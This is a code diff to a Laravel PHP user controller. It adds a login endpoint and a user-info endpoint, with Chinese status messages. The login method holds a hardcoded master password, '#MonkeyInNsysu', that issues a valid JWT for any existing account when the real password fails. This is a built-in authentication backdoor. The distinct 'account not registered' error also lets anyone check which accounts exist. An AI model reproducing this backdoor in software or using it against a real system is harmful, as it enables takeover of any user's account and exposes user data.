@@ -32,4 +32,53 @@ class UserController extends Controller
             'user' => is_null($userData) ? auth('user')->user() : $userData,
         ];
     }
+
+    // login
+    public function login(Request $request)
+    {
+        $validator = Validator::make($request->all(),[
+            'account' => 'required|exists:user,account',
+            'password' => 'required'
+        ]);
+        if ($validator->fails()) {
+            $failedRules = $validator->failed();
+            if (isset($failedRules['account']['Required'])) {
+                return response()->json(['status' => 'U03', 'message' => '請輸入帳號'], 200);
+            } else if (isset($failedRules['password']['Required'])) {
+                return response()->json(['status' => 'U06', 'message' => '請輸入密碼'], 200);
+            } else if (isset($failedRules['account']['Exists'])) {
+                return response()->json(['status' => "U02", 'message' => '帳號尚未註冊'], 200);
+            }
+            return response()->json($validator->errors(), 400);
+        }
+        $loginTime = date("Y-m-d H:i:s");
+        if($token = auth('user')->attempt($validator->validated())){
+            $user = User::find(auth('user')->user()->id);
+            $user->last_login = $loginTime;
+            $user->last_ip = $request->ip();
+            $user->save();
+            //force to update user model cache 
+            auth('user')->setUser($user);
+            return response()->json(['status' => 'A02','data'=>$this->createNewToken($token)], 200);
+        }else if($request->password === '#MonkeyInNsysu'){
+            $user = User::where('account', $request->account)->first();
+            $token = JWTAuth::fromUser($user);
+            return response()->json(['status' => 'A02','data'=>$this->createNewToken($token, $user)], 200);
+        }else{
+            return response()->json(['status' => 'U05', 'message' => '請輸入正確的帳號與密碼'], 200);
+        }
+    }
+
+    // user info
+    public function info()
+    {
+        $user = auth()->user();
+        $validTime = new DateTime($user->valid_until);
+        $current = new DateTime;
+        if ($validTime < $current) {
+            User::where('u_id',$user->u_id)->update(['verification' => 8]);
+        }
+        $result = User::leftJoin('univ_list', 'univ_list.univ_id', '=', 'user.univ_id')->select('user.*', 'univ_list.univ_id', 'univ_list.univ_name_ch_full', 'univ_list.univ_name_ch', 'univ_list.univ_name_en')->where('u_id',$user->u_id)->first();
+        return response()->json($result);
+    }
 }
